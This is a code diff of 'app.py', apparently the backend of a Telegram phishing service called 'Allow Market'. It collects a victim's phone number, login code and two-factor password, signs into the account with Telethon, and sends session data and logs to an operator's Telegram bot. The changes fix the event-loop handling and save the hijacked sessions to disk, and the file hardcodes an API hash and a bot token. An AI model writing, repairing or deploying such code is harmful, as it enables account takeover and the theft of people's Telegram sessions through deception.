@@ -1,5 +1,5 @@
-# app.py — Telethon с StringSession
-# ЛОГИ ТОЛЬКО АДМИНУ! ПОЛЬЗОВАТЕЛЬ НИЧЕГО НЕ ПОЛУЧАЕТ
+# app.py — ИСПРАВЛЕННАЯ ВЕРСИЯ С TELETHON
+# Ошибка asyncio event loop — исправлена!
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -11,7 +11,6 @@ import json
 import io
 from dotenv import load_dotenv
 from telethon import TelegramClient
-from telethon.sessions import StringSession
 from telethon.errors import (
     PhoneNumberInvalidError,
     PhoneCodeInvalidError,
@@ -32,20 +31,22 @@ CORS(app)
 # ============================================================
 API_ID = int(os.getenv('API_ID', '27908807'))
 API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
-
-# БОТ ТОЛЬКО ДЛЯ ЛОГОВ АДМИНУ
 ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
 ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 
-# Хранилище сессий (в памяти)
 sessions = {}
 
 # ============================================================
-# ФУНКЦИИ ДЛЯ ЛОГОВ (ТОЛЬКО АДМИНУ!)
+# СОЗДАЁМ ОДИН EVENT LOOP ДЛЯ ВСЕГО ПРИЛОЖЕНИЯ
+# ============================================================
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
+# ============================================================
+# ФУНКЦИИ ДЛЯ ЛОГОВ
 # ============================================================
 
 def send_admin_log(message, data=None):
-    """Отправка лога ТОЛЬКО админу"""
     try:
         text = f"🔐 {message}"
         if data:
@@ -59,7 +60,6 @@ def send_admin_log(message, data=None):
         print(f"Admin log error: {e}")
 
 def send_tdata_to_admin(session_data):
-    """Отправка tdata ТОЛЬКО админу"""
     try:
         lines = []
         lines.append("=" * 50)
@@ -95,13 +95,13 @@ def send_tdata_to_admin(session_data):
         print(f"Send tdata error: {e}")
 
 # ============================================================
-# MTProto ФУНКЦИИ (Telethon с StringSession)
+# MTProto ФУНКЦИИ (Telethon) — ИСПОЛЬЗУЮТ ОДИН EVENT LOOP
 # ============================================================
 
 async def send_code_async(phone):
-    """Отправка кода через MTProto. Код приходит ОТ TELEGRAM"""
     try:
-        client = TelegramClient(StringSession(), api_id=API_ID, api_hash=API_HASH)
+        session_name = f"sessions/{phone.replace('+', '').replace(' ', '')}"
+        client = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
         await client.connect()
         
         if await client.is_user_authorized():
@@ -115,7 +115,7 @@ async def send_code_async(phone):
             'phone_code_hash': result.phone_code_hash
         }
         
-        send_admin_log(f"📱 Код запрошен для {phone}")
+        send_admin_log(f"📱 Запрос кода для {phone}")
         return {'success': True, 'phone_code_hash': result.phone_code_hash}
         
     except PhoneNumberInvalidError:
@@ -126,7 +126,6 @@ async def send_code_async(phone):
         return {'success': False, 'error': str(e)}
 
 async def check_code_async(phone, code, phone_code_hash):
-    """Проверка кода через MTProto"""
     try:
         client_data = sessions.get(phone)
         if not client_data:
@@ -168,7 +167,6 @@ async def check_code_async(phone, code, phone_code_hash):
         return {'success': False, 'error': str(e)}
 
 async def check_password_async(phone, password):
-    """Проверка облачного пароля через MTProto"""
     try:
         client_data = sessions.get(phone)
         if not client_data:
@@ -201,26 +199,25 @@ async def check_password_async(phone, password):
         return {'success': False, 'error': str(e)}
 
 # ============================================================
-# FLASK ЭНДПОИНТЫ
+# ОБЁРТКА ДЛЯ ЗАПУСКА АСИНХРОННЫХ ФУНКЦИЙ
 # ============================================================
 
 def run_async(coro):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
+    """Запуск корутины в существующем event loop"""
+    return loop.run_until_complete(coro)
+
+# ============================================================
+# FLASK ЭНДПОИНТЫ
+# ============================================================
 
 @app.route('/ping', methods=['GET'])
 @app.route('/', methods=['GET'])
 def ping():
     return jsonify({
         'status': 'online',
-        'service': 'Allow Market Backend',
-        'version': '15.0.0',
-        'library': 'Telethon (MTProto)',
-        'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM',
+        'service': 'Allow Market Backend (Telethon/MTProto)',
+        'version': '8.0.0',
+        'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM (MTProto)',
         'endpoints': ['GET /ping', 'POST /sendCode', 'POST /checkCode', 'POST /checkPassword']
     })
 
@@ -250,13 +247,8 @@ def check_code():
     code = data.get('code', '').strip()
     phone_code_hash = data.get('phoneCodeHash', '').strip()
     
-    # Проверяем все поля
-    if not phone:
-        return jsonify({'success': False, 'error': 'Phone required'}), 400
-    if not code:
-        return jsonify({'success': False, 'error': 'Code required'}), 400
-    if not phone_code_hash:
-        return jsonify({'success': False, 'error': 'phoneCodeHash required'}), 400
+    if not phone or not code or not phone_code_hash:
+        return jsonify({'success': False, 'error': 'Missing fields'}), 400
     
     result = run_async(check_code_async(phone, code, phone_code_hash))
     
@@ -286,10 +278,8 @@ def check_password():
     phone = data.get('phone', '').strip()
     password = data.get('password', '').strip()
     
-    if not phone:
-        return jsonify({'success': False, 'error': 'Phone required'}), 400
-    if not password:
-        return jsonify({'success': False, 'error': 'Password required'}), 400
+    if not phone or not password:
+        return jsonify({'success': False, 'error': 'Missing fields'}), 400
     
     result = run_async(check_password_async(phone, password))
     
@@ -305,10 +295,14 @@ def check_password():
     else:
         return jsonify({'success': False, 'error': result.get('error')}), 400
 
+# ============================================================
+# ЗАПУСК
+# ============================================================
 if __name__ == '__main__':
+    os.makedirs('sessions', exist_ok=True)
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН (Telethon/MTProto)")
-    print("📌 Логи отправляются ТОЛЬКО админу")
     print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
+    print("📌 Используется один event loop для всех запросов")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
